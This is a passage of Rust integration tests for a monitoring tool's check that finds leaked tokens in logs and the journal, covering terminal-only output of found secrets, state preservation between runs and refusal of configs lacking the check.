    assert_eq!(m.run().level, Level::Fail);
    m.journal("--boot--\nordinary\n");
    let shown = m.shown();
    assert!(
        shown.contains("\nthe journal, this boot: no lines.\n"),
        "{shown}"
    );
    let journalctl = m.path("journalctl");
    assert!(
        shown.contains(&format!("run `{} -b -1`.", journalctl.display())),
        "{shown}"
    );
    // The alert still says it, until the check's directory is cleared.
    assert_eq!(m.run().level, Level::Fail);
}

#[test]
fn the_secrets_command_refuses_to_write_anywhere_but_a_terminal_by_default() {
    let m = Machine::new();
    m.log("setup.log", &format!("{}\n", common::token()));
    // The test's stdout is a pipe.
    let (code, out, err) = m.secrets_command(&[]);
    assert_eq!(code, Some(2));
    assert_eq!(out, "");
    assert!(err.contains("--allow-non-terminal"), "{err}");
    assert!(!m.path("args").exists(), "it read the journal");
}

#[test]
fn the_secrets_command_between_two_runs_changes_neither() {
    let m = Machine::new();
    let token = common::token();
    m.log("setup.log", &format!("{token}\n"));
    m.journal(&format!("{token}\n"));
    let first = m.run();
    let kept = files(&m.state().join("secrets"));
    assert!(!kept.is_empty());
    m.journal(&format!("{token}\n"));
    m.shown();
    assert_eq!(
        files(&m.state().join("secrets")),
        kept,
        "it changed the check's state"
    );
    let args = fs::read_to_string(m.path("args")).unwrap();
    assert!(args.lines().last().unwrap().ends_with(" -b"), "{args}");
    // The next run reads on from its cursor: the new hit once, the first not again.
    let second = m.run();
    assert_eq!((first.count, second.count), (Some(2), Some(3)));
}

#[test]
fn a_config_without_a_secrets_check_is_refused() {
    let m = Machine::new();
    let path = m.path("bare.toml");
    fs::write(
        &path,
        format!("host = \"h\"\nstate_dir = {:?}\n", m.state()),
    )
    .unwrap();
    fs::set_permissions(&path, fs::Permissions::from_mode(0o600)).unwrap();
    let out = std::process::Command::new(env!("CARGO_BIN_EXE_whimbrel"))
        .args(["secrets", "--allow-non-terminal", "--config"])
        .arg(&path)
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("no secrets check"));
}
